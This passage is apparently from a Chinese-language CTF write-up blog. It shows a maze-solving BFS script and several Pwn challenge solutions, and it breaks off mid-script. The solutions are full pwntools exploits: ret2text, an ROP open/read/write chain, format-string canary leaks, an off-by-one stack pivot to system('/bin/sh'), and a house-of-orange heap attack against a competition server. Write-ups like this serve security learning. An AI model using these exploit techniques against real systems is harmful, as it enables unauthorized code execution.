class="hljs-string">#.###.#.###.#####.#########.##</span><br><span class="hljs-string">#.#...#...#.....#.#.......#...</span><br><span class="hljs-string">#.#.#####.#####.#.#.#####.###.</span><br><span class="hljs-string">#...#...#...#...#...#...#.#...</span><br><span class="hljs-string">#.###.#.###.#.#######.#.#.#.#.</span><br><span class="hljs-string">#...#.#.#...#.#...#...#...#.#.</span><br><span class="hljs-string">###.#.#.#####.#.#.#.#######.##</span><br><span class="hljs-string">#.#...#.....#...#.#.#...#.....</span><br><span class="hljs-string">#.#########.#####.#.###.#.###.</span><br><span class="hljs-string">#.#.....#.#...#...#...#...#.#.</span><br><span class="hljs-string">#.#.#.#.#.###.#.#####.###.#.#.</span><br><span class="hljs-string">#...#.#...#.#...#...#...#...#.</span><br><span class="hljs-string">#.###.###.#.#####.#.###.###.#.</span><br><span class="hljs-string">#...#.#.#.......#.#...#.#...#.</span><br><span class="hljs-string">#####.#.#######.#.#####.#.###.</span><br><span class="hljs-string">#...#.#.......#.#...#...#.#..E</span><br><span class="hljs-string">#.#.#.#.#######.###.#.#####.#.</span><br><span class="hljs-string">#.#...#.............#.....#.#.</span><br><span class="hljs-string">#.###############.#######.#.#.</span><br><span class="hljs-string">#.........#...#...#.....#...#.</span><br><span class="hljs-string">#.#######.#.#.#####.#.#######.</span><br><span class="hljs-string">#.......#...#.......#.........</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">from</span> collections <span class="hljs-keyword">import</span> deque<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solve</span>(<span class="hljs-params">l, startX, startY, row, col</span>):<br>    <span class="hljs-comment"># å®šä¹‰æ–¹å‘å‘é‡ï¼Œä¸Šä¸‹å·¦å³åˆ†åˆ«ä¸º w, s, a, d</span><br>    directions = &#123;<span class="hljs-string">&#x27;l&#x27;</span>: (-<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), <span class="hljs-string">&#x27;o&#x27;</span>: (<span class="hljs-number">1</span>, <span class="hljs-number">0</span>), \<br>        <span class="hljs-string">&#x27;v&#x27;</span>: (<span class="hljs-number">0</span>, -<span class="hljs-number">1</span>), <span class="hljs-string">&#x27;e&#x27;</span>: (<span class="hljs-number">0</span>, <span class="hljs-number">1</span>)&#125;<br>    <span class="hljs-comment"># åˆå§‹åŒ–é˜Ÿåˆ—</span><br>    queue = deque([(startX, startY, <span class="hljs-string">&quot;&quot;</span>)])  <span class="hljs-comment"># å­˜å‚¨åæ ‡å’Œè·¯å¾„</span><br>    visited = <span class="hljs-built_in">set</span>((startX, startY))  <span class="hljs-comment"># è®°å½•è®¿é—®è¿‡çš„èŠ‚ç‚¹</span><br>    <br>    <span class="hljs-comment"># BFS éå†</span><br>    <span class="hljs-keyword">while</span> queue:<br>        x, y, path = queue.popleft()<br>        <br>        <span class="hljs-comment"># å¦‚æœåˆ°è¾¾ç»ˆç‚¹</span><br>        <span class="hljs-keyword">if</span> l[x][y] == <span class="hljs-string">&#x27;E&#x27;</span>:<br>            <span class="hljs-keyword">return</span> path<br>        <br>        <span class="hljs-comment"># éå†å››ä¸ªæ–¹å‘</span><br>        <span class="hljs-keyword">for</span> direction, (dx, dy) <span class="hljs-keyword">in</span> directions.items():<br>            nx, ny = x + dx, y + dy<br>            <br>            <span class="hljs-comment"># æ£€æŸ¥è¾¹ç•Œå’Œæ˜¯å¦å·²è®¿é—®ä»¥åŠæ˜¯å¦ä¸ºå¢™</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-number">0</span> &lt;= nx &lt; row <span class="hljs-keyword">and</span> <span class="hljs-number">0</span> &lt;= ny &lt; \<br>                col <span class="hljs-keyword">and</span> (nx, ny) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> \<br>                    visited <span class="hljs-keyword">and</span> l[nx][ny] != <span class="hljs-string">&#x27;#&#x27;</span>:<br>                visited.add((nx, ny))<br>                queue.append((nx, ny, path + direction))<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No path found&quot;</span><br><br>    <br><span class="hljs-built_in">print</span>(solve(p, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">30</span> ,<span class="hljs-number">30</span>))<br></code></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h4 id="Netcat"><a href="#Netcat" class="headerlink" title="Netcat"></a>Netcat</h4><p>ncå°±ç»™flagï¼Œç”šè‡³ä¸ç”¨catã€‚å“ªæ€•æ˜¯ç­¾åˆ°é¢˜ä¹Ÿæ˜¾å¾—è¿‡äºç®€å•äº†ã€‚</p><h4 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h4><p>æ™®é€šçš„ret2textï¼Œç»™äº†åé—¨å‡½æ•°ï¼Œæ•°ç»„ç´¢å¼•è¶Šç•Œã€‚éœ€è¦æ³¨æ„çš„æ˜¯æº¢å‡ºä¼šè¦†ç›–iï¼Œiçš„å€¼å¿…é¡»ç²¾å¿ƒå¸ƒç½®æ‰è¡Œï¼›å¦å¤–è¦retåˆ°é‚£ä¸ªleaæŒ‡ä»¤å¤„ï¼Œé˜²æ­¢æ ˆä¸å¯¹é½å¯¼è‡´é”™è¯¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main&quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>,<span class="hljs-number">20162</span>)<br><br>io.sendafter(<span class="hljs-string">b&quot;first i need your team id\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">40</span> + <span class="hljs-string">b&quot;admin\x00&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    io.sendlineafter(<span class="hljs-string">b&quot;birthday\n&quot;</span>, <span class="hljs-string">b&quot;5&quot;</span>)<br>    <br>    <br>io.sendlineafter(<span class="hljs-string">b&quot;birthday\n&quot;</span>, <span class="hljs-string">b&quot;4198942&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h4><p>æ¿å­é¢˜ï¼Œå¼€äº†æ²™ç®±ç¦ç”¨<code>execve</code>ï¼Œç”¨ret2libcåŒæ¬¾æ‰‹æ³•æ‰“orwå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>puts_plt = e.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = e.got[<span class="hljs-string">&quot;puts&quot;</span>]<br>pop_rdi = <span class="hljs-number">0x4012ce</span><br>ret = pop_rdi + <span class="hljs-number">1</span><br>main = <span class="hljs-number">0x4012a1</span><br>bss = <span class="hljs-number">0x4040a0</span><br>flag = bss + <span class="hljs-number">0x100</span><br><br><span class="hljs-built_in">print</span>(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./flag&quot;</span>))<br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b vuln</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>,<span class="hljs-number">20347</span>)<br>get_libc = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;b&quot;</span>*<span class="hljs-number">8</span> + p64(pop_rdi) + p64(puts_got) \<br>    + p64(puts_plt) + p64(main)<br>io.sendafter(<span class="hljs-string">b&quot;oh,what&#x27;s this?\n&quot;</span>, get_libc)<br>puts_addr = u64(io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libc_base = puts_addr - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>open_addr = libc_base + libc.sym[<span class="hljs-string">&quot;open&quot;</span>]<br>read_addr = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>pop_rsi = libc_base + <span class="hljs-number">0x2be51</span><br>pop_rdx = libc_base + <span class="hljs-number">0x11f2e7</span><br><br><br>payload = <span class="hljs-string">b&quot;c&quot;</span>*<span class="hljs-number">32</span> + <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span><br>payload += p64(pop_rsi) + p64(bss) + p64(read_addr)<br>payload += p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) +\<br>     p64(pop_rdx) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>)+ p64(open_addr)<br>payload += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + \<br>    p64(flag) + p64(pop_rdx) + p64(<span class="hljs-number">0x100</span>) + p64(<span class="hljs-number">0</span>)+ p64(read_addr)<br>payload += p64(pop_rdi) + p64(flag) + p64(puts_addr)<br><br>io.send(payload)<br>pause()<br>io.send(<span class="hljs-string">&quot;./flag&quot;</span>)<br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="ez-game"><a href="#ez-game" class="headerlink" title="ez_game"></a>ez_game</h4><p>æ™®é€šçš„æ‰“éšæœºæ•°ï¼Œå¥½å¤„æ˜¯å¯ä»¥æ ˆæº¢å‡ºæ§åˆ¶seedï¼Œä¸ä¼šæœ‰è¿œç¨‹å’Œæœ¬åœ°æ—¶é—´å·®å¯¼è‡´çš„é”™è¯¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br>sh = <span class="hljs-number">0x4012fc</span><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">33258</span>)<br>lib = cdll.LoadLibrary(<span class="hljs-string">&quot;libc.so.6&quot;</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;Enter your username: &quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">400</span> + p64(<span class="hljs-number">0</span>))<br><br>lib.srand(<span class="hljs-number">0</span>) <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    res = lib.rand()<br>    <span class="hljs-keyword">if</span> res &lt; <span class="hljs-number">0</span>:<br>        res %= <span class="hljs-number">7</span><br>        res -= <span class="hljs-number">7</span><br>        res += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">else</span>:<br>        res %= <span class="hljs-number">7</span><br>        res += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(res).encode()<br><br> <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">20001</span>):<br>    io.sendline(r())<br>    <br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h4><p>éå¸¸æ¶å¿ƒï¼Œæ ¼ä¸²+canaryç»•è¿‡+ret2libc+æ ˆè¿ç§»ã€‚é¦–å…ˆåˆ©ç”¨æ ¼ä¸²æ¼æ´æŠŠç¨‹åºåŸºåœ°å€ã€libcåŸºåœ°å€ã€æ ˆåœ°å€ã€canaryå€¼å…¨éƒ¨leakå‡ºæ¥ï¼Œæ­¤æ—¶mainå‡½æ•°çš„canaryå·²æŸåï¼Œä¸è¿‡æˆ‘ä»¬ä¸€ä¼šå„¿å¯ä»¥æ‰“æ ˆè¿ç§»ç»•è¿‡æ£€æŸ¥ï¼Œä¸å¿…ç†ä¼šï¼›æ¥ä¸‹æ¥åˆ©ç”¨vulnå‡½æ•°é‡Œçš„off-by-oneï¼Œè¦†ç›–rbpæŒ‡å‘çš„ä½ç½®çš„ä½å­—èŠ‚ï¼Œå®ç°æ ˆè¿ç§»ï¼Œè¿™æ ·å°±å¯ä»¥åŠ«æŒæ§åˆ¶æµé‡å¯mainäº†ã€‚æ¥ä¸‹æ¥å°±å¸¸è§„ret2libcæ‰“é€šå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br>context.terminal = [<span class="hljs-string">&#x27;wt.exe&#x27;</span>, <span class="hljs-string">&#x27;wsl&#x27;</span>]<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>e = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><span class="hljs-comment"># io = process(&quot;./pwn&quot;)</span><br><span class="hljs-comment"># io = gdb.debug(&quot;./pwn&quot;, &quot;&quot;&quot;b main</span><br><span class="hljs-comment">#                b vuln</span><br><span class="hljs-comment">#                &quot;&quot;&quot;)</span><br>io = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">26250</span>)<br><br>io.sendlineafter(<span class="hljs-string">b&quot;By the way, can you tell me your name before that?\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br>get_canary = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">8</span> + <span class="hljs-string">b&quot;%29$p&quot;</span> + <span class="hljs-string">b&quot;%15$p&quot;</span> + <span class="hljs-string">b&quot;%13$p&quot;</span> + <span class="hljs-string">b&quot;%11$p&quot;</span> + <span class="hljs-string">b&quot;0x\x00&quot;</span><br>io.sendafter(<span class="hljs-string">b&quot;Great, I&#x27;ve decided to give you a gift!\n&quot;</span>, get_canary)<br>io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">f&quot;canary&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(canary)&#125;</span>&quot;</span>)<br>stack = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>) - <span class="hljs-number">0x160</span><br>log.success(<span class="hljs-string">f&quot;stack&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(stack)&#125;</span>&quot;</span>)<br>main = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>)<br>log.success(<span class="hljs-string">f&quot;main&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(main)&#125;</span>&quot;</span>)<br>libc_base = <span class="hljs-built_in">int</span>(io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)[:-<span class="hljs-number">2</span>].decode(), <span class="hljs-number">16</span>) <br>log.success(<span class="hljs-string">f&quot;libc_start&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br><br>libc_base = libc_base - libc.sym[<span class="hljs-string">&quot;__libc_start_main&quot;</span>]-<span class="hljs-number">128</span>+<span class="hljs-number">176</span><br>puts_addr = libc_base + libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br>system_addr = libc_base + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>binsh_addr = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>))<br>pop_rdi = libc_base + <span class="hljs-number">0x2a3e5</span><br>ret = pop_rdi+<span class="hljs-number">1</span><br>log.success(<span class="hljs-string">f&quot;libc_base&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)<br>log.success(<span class="hljs-string">f&quot;puts&gt;&gt;&gt; <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(puts_addr)&#125;</span>&quot;</span>)<br>off = stack&amp;<span class="hljs-number">0xff</span><br><br><br>payload1 = p64(canary) + <span class="hljs-string">b&quot;e&quot;</span>*<span class="hljs-number">8</span> + p64(main) + p64(canary) + p8(off)<br>io.recvuntil(<span class="hljs-string">b&quot;again?????\n&quot;</span>)<br>sleep(<span class="hljs-number">3</span>)<br>io.send(payload1)<br><br><br>payload2 = <span class="hljs-string">b&quot;c&quot;</span>*(<span class="hljs-number">0x14</span>-<span class="hljs-number">0x8</span>)<br>payload2 += p64(canary)+ <span class="hljs-string">b&quot;d&quot;</span>*<span class="hljs-number">8</span> \<br>+ p64(pop_rdi) + p64(binsh_addr) + p64(ret) + p64(system_addr)<br>io.sendlineafter(<span class="hljs-string">b&quot;By the way, can you tell me your name before that?\n&quot;</span>, \<br>    payload2)<br>io.sendafter(<span class="hljs-string">b&quot;Great, I&#x27;ve decided to give you a gift!\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br>io.sendafter(<span class="hljs-string">b&quot;again?????\n&quot;</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br><br>io.interactive()<br></code></pre></td></tr></table></figure><h4 id="orange"><a href="#orange" class="headerlink" title="orange"></a>orange</h4><p>ByteCTF2024åŸé¢˜ï¼Œåªä¸è¿‡å»äº†ç¬¦å·è¡¨ã€åŠ äº†èŠ±æŒ‡ä»¤ã€‚nopæ‰èŠ±æŒ‡ä»¤ååˆ†æï¼Œå‘ç°æ²¡æœ‰freeï¼Œè€ƒè™‘<code>house of orange</code>æ”»å‡»ï¼Œåˆ©ç”¨unsorted binæ³„éœ²libcå’Œå †åœ°å€åæ‰“IOå³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs Python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack<br><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *<br><br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">s</span>(<span class="hljs-params">a</span>):<br>    p.send(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sa</span>(<span class="hljs-params">a, b</span>):<br>    p.sendafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sl</span>(<span class="hljs-params">a</span>):<br>    p.sendline(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sla</span>(<span class="hljs-params">a, b</span>):<br>    p.sendlineafter(a, b)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">r</span>():<br>    p.recv()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pr</span>():<br>    <span class="hljs-built_in">print</span>(p.recv())<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rl</span>(<span class="hljs-params">a</span>):<br>    <span class="hljs-keyword">return</span> p.recvuntil(a)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">inter</span>():<br>    p.interactive()<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_addr</span>():<br>    <span class="hljs-keyword">return</span> u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># p = process(&quot;./pwn&quot;)</span><br>p = remote(<span class="hljs-string">&quot;27.25.151.12&quot;</span>, <span class="hljs-number">32784</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>menu = <span class="hljs-string">b&quot;Enter \n&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;1&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;size\n&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;3&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;index\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size, payload:<span class="hljs-built_in">bytes</span></span>):<br>    p.sendlineafter(menu, <span class="hljs-string">b&quot;4&quot;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;index\n&quot;</span>, <span class="hljs-built_in">str</span>(index).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;size\n&quot;</span>, <span class="hljs-built_in">str</span>(size).encode())<br>    p.sendlineafter(<span class="hljs-string">b&quot;input\n&quot;</span>, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwn</span>():<br>    add(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#0</span><br>    edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x110</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x108</span>+p64(<span class="hljs-number">0xca1</span>))<br>    add(<span class="hljs-number">0x1000</span>)<span class="hljs-comment">#1</span><br>    add(<span class="hljs-number">0xc70</span>)<span class="hljs-comment">#2</span><br>    show(<span class="hljs-number">2</span>)<br>    p.recvuntil(<span class="hljs-string">&#x27;2: &#x27;</span>)<br>    libc.address = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x3ebca0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;libc:&#x27;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>    stdout = libc.address+<span class="hljs-number">0x3ec760</span><br>    wfile_jump = libc.address+<span class="hljs-number">0x3e7d60</span><br>    add(<span class="hljs-number">0xdb0</span>)<span class="hljs-comment">#3</span><br>    add(<span class="hljs-number">0x10</span>)<span class="hljs-comment">#4</span><br>    edit(<span class="hljs-number">4</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span 